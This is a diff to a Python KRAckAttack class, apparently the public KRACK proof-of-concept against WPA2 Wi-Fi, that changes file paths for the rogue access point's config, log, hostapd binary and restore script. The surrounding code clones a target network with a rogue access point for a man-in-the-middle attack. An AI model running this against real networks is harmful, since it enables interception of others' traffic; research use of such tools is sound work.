@@ -918,14 +918,14 @@ class KRAckAttack():
 		self.sock_rogue.attach_filter(bpf)
 
 		# Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
-		with open("krackattacks-poc-zerokey/krackattack/hostapd_rogue.conf", "w") as fp:
+		with open("hostapd_rogue.conf", "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
-		self.hostapd = subprocess.Popen(["krackattacks-poc-zerokey/hostapd/hostapd", "hostapd_rogue.conf", "-dd", "-K"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-		self.hostapd_log = open("krackattacks-poc-zerokey/krackattack/hostapd_rogue.log", "w")
+		self.hostapd = subprocess.Popen(["../hostapd/hostapd", "hostapd_rogue.conf", "-dd", "-K"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		self.hostapd_log = open("hostapd_rogue.log", "w")
 
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
 		time.sleep(1)
-
+		#TODO path my be incorrect
 		self.hostapd_ctrl = Ctrl("hostapd_ctrl/" + self.nic_rogue_ap)
 		self.hostapd_ctrl.attach()
 	
@@ -982,7 +982,7 @@ class KRAckAttack():
 			self.hostapd_log.close()
 		if self.sock_real: self.sock_real.close()
 		if self.sock_rogue: self.sock_rogue.close()
-		subprocess.call(["./restoreClientWifi.sh"])
+		subprocess.call(["../../restoreClientWifi.sh"])
 
 def cleanup():
 	attack.stop()
